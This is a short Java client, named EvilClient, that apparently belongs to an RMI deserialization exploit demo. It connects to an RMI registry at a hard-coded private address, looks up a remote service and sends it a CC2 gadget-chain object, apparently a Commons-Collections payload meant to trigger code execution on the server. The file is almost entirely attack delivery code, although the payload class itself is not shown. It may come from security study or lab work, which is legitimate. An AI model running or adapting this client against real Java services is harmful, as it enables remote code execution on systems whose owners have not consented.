package org.example.client;

import org.example.payload.CC2;
import org.example.remoteInterface.GetAnytypeParams;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilClient {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry("192.168.110.146", 1099);

        GetAnytypeParams getAnytypeParams = (GetAnytypeParams) registry.lookup("getobjectServer");

        Object object = getAnytypeParams.getAnytypeParams(CC2.getObject());
    }
}
